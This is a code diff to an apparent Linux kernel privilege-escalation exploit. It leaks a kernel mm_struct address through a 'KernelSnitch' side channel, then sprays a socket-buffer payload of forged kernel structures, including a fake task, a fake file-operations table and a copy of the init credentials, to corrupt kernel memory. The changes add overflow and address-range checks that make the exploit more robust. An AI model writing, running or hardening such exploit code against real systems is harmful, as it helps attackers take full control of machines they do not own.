@@ -1,6 +1,7 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
 #include "kernelsnitch/kernelsnitch.h"
+#include "target.h"
 
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
@@ -315,12 +316,38 @@ void prepare_ctxs(void) {
 int prepare_skb_payload(uintptr_t base) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
+  /* Check for overflow in payload_base calculation */
+  if (base > UINTPTR_MAX - SKB_DATA_DELTA) {
+    pr_error("prepare_skb_payload: base=0x%zx would overflow with SKB_DATA_DELTA\n", base);
+    return 0;
+  }
   uintptr_t payload_base = base + SKB_DATA_DELTA;
 
+  /* Check for overflow in fake structure offset calculations */
+  if (payload_base > UINTPTR_MAX - LOCK_OFF) {
+    pr_error("prepare_skb_payload: payload_base=0x%zx would overflow with LOCK_OFF\n", payload_base);
+    return 0;
+  }
   fake_lock = payload_base + LOCK_OFF;
+
+  if (payload_base > UINTPTR_MAX - W0_OFF) {
+    pr_error("prepare_skb_payload: payload_base=0x%zx would overflow with W0_OFF\n", payload_base);
+    return 0;
+  }
   fake_w0 = payload_base + W0_OFF;
+
+  if (payload_base > UINTPTR_MAX - FAKE_TASK_OFF) {
+    pr_error("prepare_skb_payload: payload_base=0x%zx would overflow with FAKE_TASK_OFF\n", payload_base);
+    return 0;
+  }
   fake_task = payload_base + FAKE_TASK_OFF;
+
+  if (payload_base > UINTPTR_MAX - FOPS_TABLE_OFF) {
+    pr_error("prepare_skb_payload: payload_base=0x%zx would overflow with FOPS_TABLE_OFF\n", payload_base);
+    return 0;
+  }
   fake_fops = payload_base + FOPS_TABLE_OFF;
+
   if (pselect_custom_write) {
     if (pselect_child_node) {
       if (pselect_custom_write == 2) {
@@ -328,6 +355,10 @@ int prepare_skb_payload(uintptr_t base) {
         fake_right = data_addr(g_init_cred_image);
       } else {
         /* W1 targets the initialized page at base+0x100. */
+        if (base > UINTPTR_MAX - 0x100) {
+          pr_error("prepare_skb_payload: base=0x%zx would overflow with +0x100\n", base);
+          return 0;
+        }
         fake_right = base + 0x100;
       }
     } else {
@@ -335,7 +366,16 @@ int prepare_skb_payload(uintptr_t base) {
     }
     fake_left = 0;
     if (pselect_custom_write == 2) {
+      if (payload_base > UINTPTR_MAX - CRED_COPY_OFF) {
+        pr_error("prepare_skb_payload: payload_base=0x%zx would overflow with CRED_COPY_OFF\n", payload_base);
+        return 0;
+      }
       fake_fops = payload_base + CRED_COPY_OFF;
+    }
+    /* Check for underflow in fake_parent calculation */
+    if (pselect_custom_target < 8) {
+      pr_error("prepare_skb_payload: pselect_custom_target=0x%zx too small for -8\n", pselect_custom_target);
+      return 0;
     }
     fake_parent = pselect_custom_target - 8;
   }
@@ -521,7 +561,31 @@ uintptr_t prepare_kernel_page(void) {
     return 0;
   }
 
+  /* Validate leaked address is within expected kernel memory range */
+  if (leaked < DIRECT_MAP_BASE || leaked >= DIRECT_MAP_END) {
+    pr_warning("KernelSnitch leaked mm_struct=0x%zx outside valid kernel range [0x%llx, 0x%llx)\n",
+               leaked, DIRECT_MAP_BASE, DIRECT_MAP_END);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
+  /* Check alignment to ORDER3_SIZE */
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  if (base < DIRECT_MAP_BASE || base >= DIRECT_MAP_END) {
+    pr_warning("KernelSnitch aligned base=0x%zx outside valid kernel range after alignment\n", base);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
   if (!prepare_skb_payload(base)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
